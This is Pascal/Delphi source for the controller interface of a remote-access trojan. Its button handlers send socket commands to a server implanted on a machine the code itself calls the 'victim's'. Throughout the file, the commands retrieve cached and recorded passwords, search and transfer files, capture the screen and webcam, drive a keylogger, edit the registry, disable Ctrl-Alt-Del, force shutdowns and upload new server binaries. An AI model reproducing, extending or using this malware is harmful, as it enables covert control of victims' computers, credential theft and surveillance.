procedure TMainForm.OutlookBtn31Click(Sender: TObject);
var bigstr,str,str2,len:string;
begin
 if Conectat then begin
 if NotPassedVersionCheck('1.4') then exit;
 InitiateTransfer;
 FindFiles.Lista.Clear;
 if FlatCheckBox2.checked then bigstr:='T' else bigstr:='F';
 str:=FlatEdit19.text;
 str2:=FlatEdit20.text;
 if str2[length(str2)]<>'\' then str2:=str2+'\';
 if length(str)<10 then len:='0'+inttostr(length(str)) else len:=IntToStr(length(str));
 bigstr:=bigstr+len+str+str2;
 ClientSocket.Socket.SendText('FFN'+bigstr);
 Status.Caption:='searching files...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn32Click(Sender: TObject);
begin
 Anim.Animeaza(FindFiles);
end;

procedure TMainForm.OutlookBtn33Click(Sender: TObject);
begin
if Conectat then begin
 if NotPassedVersionCheck('1.3') then exit;
 StartAnimation;
 ClientSocket.Socket.SendText('PSS');
 Status.Caption:='downloading cached passwords...';
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn35Click(Sender: TObject);
begin
if AreYouSure('clear recorded passwords?') then
 if Conectat then begin
  ClientSocket.Socket.SendText('CPL');
  Status.Caption:='clearing recorded passwords...';
  StartAnimation;
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn34Click(Sender: TObject);
begin
 if Conectat then begin
  if NotPassedVersionCheck('1.3') then exit;
  InitiateTransfer;
  ClientSocket.Socket.SendText('GPW');
  Status.Caption:='receiving recorded passwords...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn36Click(Sender: TObject);
begin
 Anim.Animeaza(Pass);
end;

procedure TMainForm.OutlookBtn37Click(Sender: TObject);
begin
 if Conectat then begin
  if NotPassedVersionCheck('1.3') then exit;
  InitiateTransfer;
  ClientSocket.Socket.SendText('IRG');
  Status.Caption:='opening registry editor...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.FlatSpeedButton6Click(Sender: TObject);
begin
 if FlatSpeedButton6.Down then
  PrintMemo.Font.Style:=PrintMemo.Font.Style+[fsBold] else
  PrintMemo.Font.Style:=PrintMemo.Font.Style-[fsBold];
end;

procedure TMainForm.FlatSpeedButton7Click(Sender: TObject);
begin
 if FlatSpeedButton7.Down then
  PrintMemo.Font.Style:=PrintMemo.Font.Style+[fsItalic] else
  PrintMemo.Font.Style:=PrintMemo.Font.Style-[fsItalic];
end;

procedure TMainForm.FlatSpeedButton8Click(Sender: TObject);
begin
 if FlatSpeedButton8.Down then
  PrintMemo.Font.Style:=PrintMemo.Font.Style+[fsUnderLine] else
  PrintMemo.Font.Style:=PrintMemo.Font.Style-[fsUnderLine];
end;

procedure TMainForm.FlatSpeedButton9Click(Sender: TObject);
begin
 if FlatSpeedButton9.Down then
  PrintMemo.Font.Style:=PrintMemo.Font.Style+[fsStrikeout] else
  PrintMemo.Font.Style:=PrintMemo.Font.Style-[fsStrikeout];
end;

procedure TMainForm.FlatEdit21Change(Sender: TObject);
begin
 PrintMemo.Font.Size:=StrToInt(FlatEdit21.Text);
end;

procedure TMainForm.OutlookBtn38Click(Sender: TObject);
var sendit:string;
begin
if Conectat then begin
 if NotPassedVersionCheck('1.6') then exit;
 StartAnimation;
 sendit:='';
 if flatspeedbutton6.down then sendit:=sendit+'1' else sendit:=sendit+'0';
 if flatspeedbutton7.down then sendit:=sendit+'1' else sendit:=sendit+'0';
 if flatspeedbutton8.down then sendit:=sendit+'1' else sendit:=sendit+'0';
 if flatspeedbutton9.down then sendit:=sendit+'1' else sendit:=sendit+'0';
 if PrintMemo.Font.Size<10 then
  sendit:=sendit+'0'+IntToStr(PrintMemo.font.size) else
   if PrintMemo.Font.Size>99 then
    sendit:=sendit+'99' else
     sendit:=sendit+IntToStr(PrintMemo.font.size);
 ClientSocket.Socket.SendText('PRN'+sendit+PrintMemo.lines.text);
 Status.Caption:='printing text...';
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn39Click(Sender: TObject);
begin
 if Conectat then begin
  StartAnimation;
  ClientSocket.Socket.SendText('URL'+FlatEdit22.Text);
  Status.Caption:='opening web browser...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn40Click(Sender: TObject);
begin
 if Conectat then begin
  if NotPassedVersionCheck('1.6') then exit;
  StartAnimation;
  ClientSocket.Socket.SendText('CRS'+FlatEdit22.Text);
  Status.Caption:='downloading list of available resolutions...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn41Click(Sender: TObject);
begin
 if Conectat then begin
  if NotPassedVersionCheck('1.6') then exit;
  StartAnimation;
  ClientSocket.Socket.SendText('CRT'+IntToStr(ResList.ItemIndex));
  Status.Caption:='changing resolution...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.Label43Click(Sender: TObject);
begin
 with Label43 do begin
  PickColor.Color:=Color;
  if PickColor.Execute then Color:=PickColor.Color;
 end;
end;

procedure TMainForm.OutlookBtn44Click(Sender: TObject);
var c:array[1..3] of TColor;
    cols:array[1..3] of integer;
    temp:array[1..3] of TColor;
begin
 temp[1]:=GetSysColor(COLOR_MENU);
 temp[2]:=GetSysColor(COLOR_3DFACE);
 temp[3]:=GetSysColor(COLOR_WINDOW);
 c[1]:=ColorToRGB(Label43.Color);
 c[2]:=ColorToRGB(Label44.Color);
 c[3]:=ColorToRGB(Label45.Color);
 cols[1]:=COLOR_MENU;
 cols[2]:=COLOR_3DFACE;
 cols[3]:=COLOR_WINDOW;
 SetSysColors(3,cols,c);
 ShowMsg('this is how the victim''s windows colors will look like. click [ok] to set default colors');
 SetSysColors(3,cols,temp);
end;

procedure TMainForm.Label44Click(Sender: TObject);
begin
 with Label44 do begin
  PickColor.Color:=Color;
  if PickColor.Execute then Color:=PickColor.Color;
 end;
end;

procedure TMainForm.Label45Click(Sender: TObject);
begin
 with Label45 do begin
  PickColor.Color:=Color;
  if PickColor.Execute then Color:=PickColor.Color;
 end;
end;

procedure TMainForm.OutlookBtn43Click(Sender: TObject);
begin
 if Conectat then begin
  if NotPassedVersionCheck('1.8') then exit;
  StartAnimation;
  ClientSocket.Socket.SendText('RWC');
  Status.Caption:='restoring windows colors...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn42Click(Sender: TObject);
begin
 if Conectat then begin
  if NotPassedVersionCheck('1.8') then exit;
  StartAnimation;
  ClientSocket.Socket.SendText('CWC'+ColorToString(Label43.Color)+';'+ColorToString(Label44.Color)+':'+ColorToString(Label45.Color));
  Status.Caption:='changing windows colors...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn45Click(Sender: TObject);
begin
 SendCommand('RWN1','forcing windows shut down...','2.0');
end;

procedure TMainForm.OutlookBtn52Click(Sender: TObject);
begin
 if Conectat then begin
  StartAnimation;
  ClientSocket.Socket.SendText('BMB');
  Status.Caption:='trying to restore mouse buttons...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn46Click(Sender: TObject);
begin
 if Conectat then begin
  StartAnimation;
  ClientSocket.Socket.SendText('RMB');
  Status.Caption:='trying to reverse mouse buttons...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn47Click(Sender: TObject);
begin
 if Conectat then begin
  StartAnimation;
  ClientSocket.Socket.SendText('SMCoff');
  Status.Caption:='hiding mouse cursor...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn48Click(Sender: TObject);
begin
 if Conectat then begin
  StartAnimation;
  ClientSocket.Socket.SendText('SMCon');
  Status.Caption:='showing mouse cursor...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn51Click(Sender: TObject);
begin
 if Conectat then begin
  StartAnimation;
  ClientSocket.Socket.SendText('SMToff');
  Status.Caption:='setting mouse trails...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn50Click(Sender: TObject);
var mystr:string;
begin
 if Conectat then begin
{  GetTextForm.GetText('mouse trails','trails: [2 to 10]','',false,MyStr);
  if ((MyStr<>'') and (StrToInt(MyStr)<2) and (StrToInt(MyStr)>10)) then
   begin ShowMsg('hello?? it''s gotta be between 2 and 10');exit;end;
  if MyStr='' then exit;}
  MyStr:=IntToStr(RxSlider2.Value);
  StartAnimation;
  ClientSocket.Socket.SendText('SMT'+mystr);
  Status.Caption:='setting mouse trails...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn53Click(Sender: TObject);
begin
 ClientSocket.Socket.SendText('MMStop');
 UnhookWindowsHookEx(MouseHook);
 MouseMsg.Free;
 MouseHook := 0;
 Status.Caption := 'stopped.';
end;

function MouseProc(Code : Integer; wParam : WPARAM; lParam : LPARAM) : LongInt; stdcall;
var
  Point : TPoint;
begin
  try
    Result := 0;
    if Code < 0 then
      CallNextHookEx(MainForm.MouseHook, Code, WParam, LParam);
  except
    Application.HandleException(nil);
  end;
  if Code <> HC_NOREMOVE then begin
    Point := TMouseHookStruct(Pointer(lParam)^).pt;
    MainForm.SendMousePos(Point.x, Point.y);
  end;
end;

procedure TMainForm.SendMousePos(x,y:Integer);
const
  NumEvents : Word = 0;
begin
  Inc(NumEvents);
  if NumEvents = 2 then begin
    Status.Caption:='movin'' the mouse to: '+IntToStr(X)+','+IntToStr(Y);
    try MouseMsg.PostIt('x'+IntToStr(X)+'y'+IntToStr(Y)+';');
    except end;
    NumEvents := 0;
  end;
end;

procedure TMainForm.OutlookBtn49Click(Sender: TObject);
begin
 if Conectat then begin
 ClientSocket.Socket.SendText('MMStart');
 MouseHook := SetWindowsHookEx(WH_MOUSE, MouseProc, 0, GetCurrentThreadID);
 try
  MouseMsg := TNMMsg.Create(Self);
  MouseMsg.TimeOut := 250;
  MouseMsg.ReportLevel := 0;
  MouseMsg.Host := ClientSocket.Address;
  MouseMsg.Port := 6776;
  MouseMsg.FromName := 'MMT';
 except end;
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn54Click(Sender: TObject);
begin
 if Conectat then begin
  if NotPassedVersionCheck('1.3') then exit;
  InitiateTransfer;
  ClientSocket.Socket.SendText('RSF'+FlatEdit23.Text);
  Status.Caption:='recording...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn55Click(Sender: TObject);
begin
 sndPlaySound(PChar(DownloadFolder+'soundfile.wav'),Snd_Sync);
end;

procedure TMainForm.OutlookBtn56Click(Sender: TObject);
begin
 if Conectat then begin
  if NotPassedVersionCheck('1.8') then exit;
  StartAnimation;
  ClientSocket.Socket.SendText('RTD');
  Status.Caption:='readin'' current time and date...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.DataReceived(data:string);
begin
 MyTime.wYear:=StrToInt(copy(data,2,4));
 MyTime.wMonth:=StrToInt(copy(data,6,2));
 MyTime.wDay:=StrToInt(copy(data,8,2));
 MyTime.wHour:=StrToInt(copy(data,11,2));
 MyTime.wMinute:=StrToInt(copy(data,13,2));
 FlatEdit25.Text:=IntToStr(MyTime.wMonth)+'/'+IntToStr(MyTime.wDay)+'/'+IntToStr(MyTime.wYear);
 {dateedit1.date:=SystemTimeToDateTime(MyTime);}
 if MyTime.wHour>12 then
  FlatEdit24.Text:=IntToStr(MyTime.wHour-12)+':'+IntToStr(MyTime.wMinute)
 else
  FlatEdit24.Text:=IntToStr(MyTime.wHour)+':'+IntToStr(MyTime.wMinute);
 if MyTime.wHour>12 then FlatComboBox1.ItemIndex:=1 else FlatComboBox1.ItemIndex:=0;
end;

procedure FalDe2(var tt:string;l:integer);
var i:integer;
begin
if length(tt)=l then exit;
for i:=1 to l-length(tt) do
 tt:='0'+tt;
end;

function FalDe3(tt:string;l:integer):String;
var i:integer;
begin
Result:=tt;
if length(tt)=l then exit;
for i:=1 to l-length(tt) do
 tt:='0'+tt;
Result:=tt;
end;

procedure TMainForm.OutlookBtn57Click(Sender: TObject);
var t,str:string;la:integer;
begin
 if Conectat then begin
  if NotPassedVersionCheck('1.8') then exit;
  StartAnimation;
   str:='STD0199907251';
   t:=copy(flatedit24.text,1,pos(':',flatedit24.text)-1);
   if flatcombobox1.itemindex=1 then t:=IntToStr( StrToInt(t)+12 );FalDe2(t,2);str:=str+t;
   t:=copy(flatedit24.text,pos(':',flatedit24.text)+1,2);FalDe2(t,2);str:=str+t;
  ClientSocket.Socket.SendText(str);
  Status.Caption:='setting new time...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn58Click(Sender: TObject);
var t,str:string;la:integer;
begin
 if Conectat then begin
  if NotPassedVersionCheck('1.8') then exit;
  StartAnimation;
   t:=FlatEdit25.Text;
   if t[2]='/' then begin la:=2;MyTime.wMonth:=StrToInt(t[1]);end
    else begin la:=3;MyTime.wMonth:=StrToInt(copy(t,1,2));end;
   if t[la+2]='/' then begin MyTime.wDay:=StrToInt(t[la+1]);la:=la+2;end
    else begin MyTime.wDay:=StrToInt(copy(t,la+1,2));inc(la,3);end;
   MyTime.wYear:=StrToInt(copy(t,la+1,length(t)));
   str:='STD1';
   t:=IntToStr(MyTime.wYear);FalDe2(t,4);str:=str+t;
   t:=IntToStr(MyTime.wMonth);FalDe2(t,2);str:=str+t;
   t:=IntToStr(MyTime.wDay);FalDe2(t,2);str:=str+t;
   str:=str+'01200';
  ClientSocket.Socket.SendText(str);
  Status.Caption:='setting new date...';
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.SendCommand(c,m,v:string);
begin
 if Conectat then begin
  if NotPassedVersionCheck(v) then exit;
  StartAnimation;
  ClientSocket.Socket.SendText(c);
  Status.Caption:=m;
  fileM.Stat.Caption:=Status.Caption;
 end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn59Click(Sender: TObject);
begin
 SendCommand('HDI','hiding desktop icons...','1.0');
end;

procedure TMainForm.OutlookBtn64Click(Sender: TObject);
begin
 SendCommand('SDI','showing desktop icons...','1.0');
end;

procedure TMainForm.OutlookBtn60Click(Sender: TObject);
begin
 SendCommand('STA1','hiding Start button...','1.0');
end;

procedure TMainForm.OutlookBtn65Click(Sender: TObject);
begin
 SendCommand('STA2','showing Start button...','1.0');
end;

procedure TMainForm.OutlookBtn61Click(Sender: TObject);
begin
 SendCommand('HTB','hiding taskbar...','1.0');
end;

procedure TMainForm.OutlookBtn66Click(Sender: TObject);
begin
 SendCommand('STB','showing taskbar...','1.0');
end;

procedure TMainForm.OutlookBtn62Click(Sender: TObject);
begin
 SendCommand('OCD','opening the CD ROM...','1.0');
end;

procedure TMainForm.OutlookBtn67Click(Sender: TObject);
begin
 SendCommand('CCD','closing the CD ROM...','1.0');
end;

procedure TMainForm.OutlookBtn63Click(Sender: TObject);
begin
 SendCommand('SP1','starting the pc speaker...','1.0');
end;

procedure TMainForm.OutlookBtn68Click(Sender: TObject);
begin
 SendCommand('SP2','stopping the pc speaker...','1.0');
end;

procedure TMainForm.OutlookBtn77Click(Sender: TObject);
begin
 SendCommand('TMN','turning ON monitor...','1.0');
end;

procedure TMainForm.OutlookBtn78Click(Sender: TObject);
begin
 SendCommand('TMF','turning OFF monitor...','1.0');
end;

procedure TMainForm.OutlookBtn76Click(Sender: TObject);
begin
 SendCommand('CAE','trying to enable Ctrl Alt Del...','1.2');
end;

procedure TMainForm.OutlookBtn75Click(Sender: TObject);
begin
 SendCommand('CAD','trying to disable Ctrl Alt Del...','1.2');
end;

procedure TMainForm.OutlookBtn73Click(Sender: TObject);
begin
 SendCommand('SCLON','setting ScrollLock ON...','1.4');
end;

procedure TMainForm.OutlookBtn72Click(Sender: TObject);
begin
 SendCommand('CSLON','setting CapsLock ON...','1.4');
end;

procedure TMainForm.OutlookBtn74Click(Sender: TObject);
begin
 SendCommand('SCLOFF','setting ScrollLock OFF...','1.4');
end;

procedure TMainForm.OutlookBtn71Click(Sender: TObject);
begin
 SendCommand('CSLOFF','setting CapsLock OFF...','1.4');
end;

procedure TMainForm.OutlookBtn69Click(Sender: TObject);
begin
 SendCommand('NMLON','setting NumLock ON...','1.4');
end;

procedure TMainForm.OutlookBtn70Click(Sender: TObject);
begin
 SendCommand('NMLOFF','setting NumLock OFF...','1.4');
end;

procedure TMainForm.TrayIconClick(Sender: TObject; Button: TMouseButton;
  Shift: TShiftState; X, Y: Integer);
begin
 Application.Restore;
 Show;
end;

procedure TMainForm.OutlookBtn79Click(Sender: TObject);
begin
 Anim.Animeaza(ICQForm);
end;

procedure TMainForm.OutlookBtn80Click(Sender: TObject);
begin
 Anim.Animeaza(NonStopForm);
end;

procedure TMainForm.OutlookBtn81Click(Sender: TObject);
var qual:string;
begin
if Conectat then begin
 if NotPassedVersionCheck('1.3') then exit;
 InitiateTransfer;
 qual:=IntToStr(TrackBar2.Value);
 if length(qual)=1 then qual:='00'+qual;
 if length(qual)=2 then qual:='0'+qual;
 ClientSocket.Socket.SendText('CSS'+qual);
 Status.Caption:='capturing...';
end else Status.Caption:=NotConnected;
end;

procedure TMainForm.OutlookBtn83Click(Sender: TObject);
begin
 if (not FlatCheckBox4.Checked) and (not FlatCheckBox3.Checked)
  then begin
   ShowMsg('you gotta pick [horizontally], [vertically] or both');
   exit;
  end;
 if (flatcheckbox3.checked) and (flatcheckbox4.checked) then SendCommand('FLP11','flipping victim''s screen...','1.3');
 if (flatcheckbox3.checked) and (not flatcheckbox4.checked) then SendCommand('FLP10','flipping victim''s screen...','1.3');
 if (not flatcheckbox3.checked) and (flatcheckbox4.checked) then SendCommand('FLP01','flipping victim''s screen...','1.3');
end;

procedure TMainForm.OutlookBtn82Click(Sender: TObject);
begin
 Anim.Animeaza(WebCam);
end;

procedure TMainForm.OutlookBtn7Click(Sender: TObject);
begin
 _Pagini.ActivePage:=pSendKeys;
end;

procedure TMainForm.OutlookBtn85Click(Sender: TObject);
begin
 SendCommand('RAW','refreshing...','1.3');
end;

procedure TMainForm.Memo1KeyDown(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
//if key=8 then
// KeysToSend:=copy(KeysToSend,1,length(KeysToSend)-1);
end;

procedure TMainForm.Memo1KeyPress(Sender: TObject; var Key: Char);
begin
// KeysToSend:=KeysToSend+Key;
end;

procedure TMainForm.Memo1KeyUp(Sender: TObject; var Key: Word;
  Shift: TShiftState);
begin
// if key=13 then
//  KeysToSend:=KeysToSend+#130;
end;

procedure TMainForm.OutlookBtn84Click(Sender: TObject);
var len:string;
begin
 KeysToSend:=Memo1.Lines.Text;
{ for i:=1 to Length(Memo1.Lines.Text) do
  KeysToSend:=KeysToSend+Memo1.Lines.Text[i];}
  
 len:=IntToStr(ListBox1.ItemIndex+1);
 if length(len)=1 then len:='0'+len;
 SendCommand('MTK'+len+KeysToSend,'sending keys...','1.2');
 KeysToSend:='';
 memo1.lines.clear;
end;

procedure TMainForm.OutlookBtn86Click(Sender: TObject);
begin
 KeysToSend:='';
 memo1.lines.clear;
end;

procedure TMainForm.OutlookBtn15Click(Sender: TObject);
begin
 if (OpenServer.Execute) and (FileExists(OpenServer.FileName)) then
 begin
  CeSaTrimita:=OpenServer.FileName;
  SendCommand('UPS','initiating transfer...','2.0');
 end; 
end;

procedure TMainForm.OutlookBtn87Click(Sender: TObject);
begin
 SendCommand('SVT0','reading volume settings...','1.8');
end;

procedure TMainForm.OutlookBtn88Click(Sender: TObject);
begin
 MainForm.SendCommand('SVT1'+IntToStr(RxWaveBar.Value),'setting wave volume...','1.8');
end;

procedure TMainForm.OutlookBtn89Click(Sender: TObject);
begin
 MainForm.SendCommand('SVT2'+IntToStr(RxSynthBar.Value),'setting synth volume...','1.8');
end;

procedure TMainForm.OutlookBtn90Click(Sender: TObject);
begin
 MainForm.SendCommand('SVT3'+IntToStr(RxCDBar.Value),'setting cd volume...','1.8');
end;

procedure TMainForm.OutlookBtn18Click(Sender: TObject);
begin
 SendCommand('RSP','restarting server...','2.0');
end;

procedure TMainForm.IPEditChange(Sender: TObject);
var s:string;
begin
 s:=IPEdit.Text;
 if pos(':',s)<>0 then
  AniTimer.Interval:=77;
end;

procedure TMainForm.pLocalFolderEnter(Sender: TObject);
begin
 Label61.Caption:=ReadKey('folder');
end;

procedure TMainForm.SaveIT(f:TForm;une:integer);
begin
 WriteKey(inttostr(une)+'_x',inttostr(f.left));
 WriteKey(inttostr(une)+'_y',inttostr(f.top));
 WriteKey(inttostr(une)+'_w',inttostr(f.width));
 WriteKey(inttostr(une)+'_h',inttostr(f.height));
end;

procedure TMainForm.FormClose(Sender: TObject; var Action: TCloseAction);
var n:string;
begin
 try SaveIT(ClientChat,1);except end;
 try SaveIT(FileM,2);except end;
 try SaveIT(FindFiles,3);except end;
 try SaveIT(GetNewPath,4);          except end;
 try SaveIT(ICQForm,5);                        except end;
 try SaveIT(Keylogger,6);except end;
 try SaveIT(MainForm,7);except end;
 try SaveIT(nonstopForm,8);except end;
 try SaveIT(RegEdit,9);except end;
 try SaveIT(VictimChat,10);except end;
 try SaveIT(WebCam,11);except end;
 try SaveIT(winM,12);except end;
 try SaveIT(TheMatrix,13);except end;
 try SaveIT(IPTool,14);except end;
 try SaveIT(procM,15);except end;
 try SaveIT(AddressBook,16);except end;
 try SaveIT(Bookmarks,17);except end;
 try SaveIT(SniffLog,18);except end;
 try SaveRegSettings;except end;
 bit_window.free;
 bit_button.free;
 bit_btn_fill.free;
 bit_close_btn.free;
 bit_ip_btn.free;
 bit_min_btn.free;
 bit_main.free;
 bit_con_btn.free;
 bit_dis_btn.free;
 bit_ping_btn.free;
 HALT;
end;

procedure TMainForm.pPrintShow(Sender: TObject);
begin
 if FlatSpeedButton6.Down then PrintMemo.Font.Style:=PrintMemo.Font.Style+[fsBold] else PrintMemo.Font.Style:=PrintMemo.Font.Style-[fsBold];
 if FlatSpeedButton7.Down then PrintMemo.Font.Style:=PrintMemo.Font.Style+[fsItalic] else PrintMemo.Font.Style:=PrintMemo.Font.Style-[fsItalic];
 if FlatSpeedButton8.Down then PrintMemo.Font.Style:=PrintMemo.Font.Style+[fsUnderline] else PrintMemo.Font.Style:=PrintMemo.Font.Style-[fsUnderline];
 if FlatSpeedButton9.Down then PrintMemo.Font.Style:=PrintMemo.Font.Style+[fsStrikeout] else PrintMemo.Font.Style:=PrintMemo.Font.Style-[fsStrikeout];
end;

procedure TMainForm.Image4Click(Sender: TObject);
begin
 ShellExecute(handle, 'open', pchar(LinkToBanner), Nil, Nil, SW_SHOWNORMAL);
end;

procedure TMainForm.Image1Click(Sender: TObject);
begin
 Anim.Animeaza(About);
end;

procedure TMainForm.OutlookBtn93Click(Sender: TObject);
begin
 if BrowseFolder.Execute then
 Label61.Caption:=BrowseFolder.RootPath;
 if Label61.Caption[Length(Label61.Caption)]='\' then
  WriteKey('folder',Label61.Caption) else
  begin Label61.Caption:=Label61.Caption+'\';
 WriteKey('folder',Label61.Caption);end;
end;

procedure TMainForm.FormShow(Sender: TObject);
var r:string;
    fol:string;
begin
 if AlreadyDone then Exit;
 AlreadyDone:=True;
 r:=ReadKey('settings_file');
 if ((r<>'') and (r<>'default')) then begin
  if (not FileExists(r)) then Status.Caption:='settings file not found. using default settings.'
  else begin
  with OutBar do begin
   Clear;
   Pages.LoadFromFile(r);
  end;
   SetTheColors;
 end;
 end;
{try r:=ReadKey('color1');except r:='';end;if r<>'' then try cMenuBackground:=StringToColor(r);except end;
 try r:=ReadKey('color2');except r:='';end;if r<>'' then try cMenuPageNormalText:=StringToColor(r);except end;
 try r:=ReadKey('color3');except r:='';end;if r<>'' then try cMenuPageNormalBorder:=StringToColor(r);except end;
 try r:=ReadKey('color4');except r:='';end;if r<>'' then try cMenuPageSelectedBorder:=StringToColor(r);except end;
 try r:=ReadKey('color5');except r:='';end;if r<>'' then try cMenuItemNormalText:=StringToColor(r);except end;
 try r:=ReadKey('color6');except r:='';end;if r<>'' then try cMenuItemNormalBorder:=StringToColor(r);except end;
 try r:=ReadKey('color7');except r:='';end;if r<>'' then try cMenuItemSelectedText:=StringToColor(r);except end;
 try r:=ReadKey('color8');except r:='';end;if r<>'' then try cMenuArrows:=StringToColor(r);except end;
 try r:=ReadKey('color9');except r:='';end;if r<>'' then try cFormLine:=StringToColor(r);except end;
 try r:=ReadKey('color10');except r:='';end;if r<>'' then try cFormBackGround:=StringToColor(r);except end;
 try r:=ReadKey('color11');except r:='';end;if r<>'' then try cFormCaption:=StringToColor(r);except end;
 try r:=ReadKey('color12');except r:='';end;if r<>'' then try cFormText:=StringToColor(r);except end;
 try r:=ReadKey('color13');except r:='';end;if r<>'' then try cButtonText:=StringToColor(r);except end;
 try r:=ReadKey('color14');except r:='';end;if r<>'' then try cButtonBorder:=StringToColor(r);except end;
 try r:=ReadKey('color15');except r:='';end;if r<>'' then try cButtonOverFill:=StringToColor(r);except end;
 try r:=ReadKey('color16');except r:='';end;if r<>'' then try cButtonClickFill:=StringToColor(r);except end;
 try r:=ReadKey('color17');except r:='';end;if r<>'' then try cFormForeGround:=StringToColor(r);except end;
}try SetTheColors;except end;

 fol:=ReadKey('folder');
 if fol[length(fol)]<>'\' then fol:=fol+'\';
 if not DirectoryExists(fol) then
  begin
   ShowMessage('invalid local folder detected.');
   ShowMessage('pick the folder where downloaded files are saved in the next dialog.');
   if BrowseFolder.Execute then
   begin
    Label61.Caption:=BrowseFolder.RootPath;
    if Label61.Caption[Length(Label61.Caption)]='\' then
    WriteKey('folder',Label61.Caption) else
    begin Label61.Caption:=Label61.Caption+'\';
    WriteKey('folder',Label61.Caption);end;
   end else
    begin
     WriteKey('folder',ExtractFilePath(ParamStr(0)));
     Label61.Caption:=ExtractFilePath(ParamStr(0));
    end;
  end;
end;

function TMainForm.CountFeatures:integer;
var i,itemz:integer;
begin
 itemz:=0;
 for i:=1 to OutBar.Pages.Count do
  itemz:=itemz+OutBar.Pages[i-1].Count;
 result:=itemz;
end;

procedure TMainForm.OutlookBtn94Click(Sender: TObject);
var Reg:TRegistry;
begin
 if Not AreYouSure('erase all options?') then EXIT;
 Reg:=TRegistry.Create;
 with Reg do begin
  RootKey:=HKEY_LOCAL_MACHINE;
  DeleteKey(RegDir);
  free;
 end;
 HALT;
end;

procedure TMainForm.FlatCheckBox1Click(Sender: TObject);
begin
 FlatCheckBox1ClickIT;
end;

procedure TMainForm.FlatCheckBox1ClickIT;
begin
try
 if FlatCheckBox1.Checked then
  begin {try}
   ArataHinturi:=True;
  end else begin {try}
   ArataHinturi:=False;
  end;
except end;  
end;

procedure TMainForm.pMiscHide(Sender: TObject);
begin
 {SaveRegSettings;}
end;

procedure TMainForm.CancelButtonClick(Sender: TObject);
begin
 Tine:=True;
 Transferand:=False;
 InTheTransfer:=False;
{ ConnectButton.Caption:='connect';}
 Status.Caption:='stopping transfer...';
 StopAnimation;
 InTheTransfer:=False;
 Refreshing:=False;
 Gettin:=False;
 Downloading:=False;
 InTransfer:=False;
 Transfering:=False;
 Transferand:=False;
{
 Status.Width:=Status.Width+40;
 Status.Left:=Status.Left-40;
 Shape4.Width:=Shape4.Width+40;
 Shape4.Left:=Shape4.Left-40;
 CancelButton.Visible:=False;
}
 try ClientSocket.Close;except end;
 try
  ClientSocket.Open;
 except
  ConnectButton.Caption:='connect';
  ConnectBtn.Glyph.Assign(bit_con_btn);
  Status.Caption:='error connecting. check the ip or the port #.';
  try ClientSocket.Close;except end;
  Disconnected;
  StopAnimation;
  exit;
 end; 
end;

procedure TMainForm.FlatCheckBox6MouseUp(Sender: TObject;
  Button: TMouseButton; Shift: TShiftState; X, Y: Integer);
begin
 {SaveRegSettings;}
end;

procedure TMainForm.pMiscEnter(Sender: TObject);
begin
 {LoadSettings;}
end;

procedure TMainForm.SSTextClick(Sender: TObject);
begin
 PickColor.Color:=SSText.Color;
 if PickColor.Execute then SSText.Color:=PickColor.Color;
end;

procedure TMainForm.SSBackClick(Sender: TObject);
begin
 PickColor.Color:=SSBack.Color;
 if PickColor.Execute then SSBack.Color:=PickColor.Color;
end;

procedure TMainForm.OutlookBtn96Click(Sender: TObject);
var c:TColor;
    cmd:String;
begin
 if FlatCheckBox8.Checked then cmd:='1' else cmd:='0';
 if FlatCheckBox9.Checked then cmd:=cmd+'1' else cmd:=cmd+'0';
 if FlatCheckBox10.Checked then cmd:=cmd+'1' else cmd:=cmd+'0';
 if FlatRadioButton7.Checked then cmd:=cmd+'0' else cmd:=cmd+'1';
 if FlatCheckBox11.Checked then cmd:=cmd+'1' else cmd:=cmd+'0';
 cmd:=cmd+FalDe3(IntToStr(RxSlider1.Value),2);
 cmd:=cmd+FalDe3(FlatEdit27.Text,3);
 c:=SSText.Color;
 cmd:=cmd+FalDe3(IntToStr(GetRValue(ColorToRGB(c))),3);
 cmd:=cmd+FalDe3(IntToStr(GetGValue(ColorToRGB(c))),3);
 cmd:=cmd+FalDe3(IntToStr(GetBValue(ColorToRGB(c))),3);
 c:=SSBack.Color;
 cmd:=cmd+FalDe3(IntToStr(GetRValue(ColorToRGB(c))),3);
 cmd:=cmd+FalDe3(IntToStr(GetGValue(ColorToRGB(c))),3);
 cmd:=cmd+FalDe3(IntToStr(GetBValue(ColorToRGB(c))),3);
 cmd:=cmd+FalDe(FlatComboBox2.Text,3);
 cmd:=cmd+FlatComboBox2.Text;
 cmd:=cmd+FlatEdit26.Text;
 SendCommand('SNS'+cmd,'changing screensaver options...','2.0');
end;

procedure TMainForm.OutlookBtn97Click(Sender: TObject);
begin
 SendCommand('RSS','running screen saver...','2.0');
end;

procedure TMainForm.OutlookBtn95Click(Sender: TObject);
begin
 Time_a:=Now;
 SendCommand('PING','pinging the server...','2.0');
end;

procedure TMainForm.OutlookBtn99Click(Sender: TObject);
var i:integer;
begin
 Label77.Caption:='n/a'#13#10' '#13#10;
 for i:=1 to 12 do
  Label77.Caption:=Label77.Caption+'n/a'+#13#10;
end;

